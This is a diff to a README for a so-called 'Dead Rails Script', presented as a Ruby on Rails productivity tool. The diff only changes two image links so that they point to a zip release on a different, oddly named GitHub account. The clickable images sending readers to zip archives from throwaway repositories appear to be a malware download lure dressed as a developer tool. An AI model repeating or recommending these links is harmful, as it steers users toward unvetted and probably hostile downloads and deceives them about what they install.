@@ -4,10 +4,10 @@
 **Dead Rails Script** is a robust and efficient Ruby on Rails script designed to assist developers with testing, debugging, and automating repetitive tasks in Rails applications. Whether you are working with legacy code or developing a new project, this script simplifies complex Rails tasks and enhances productivity.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ## Features
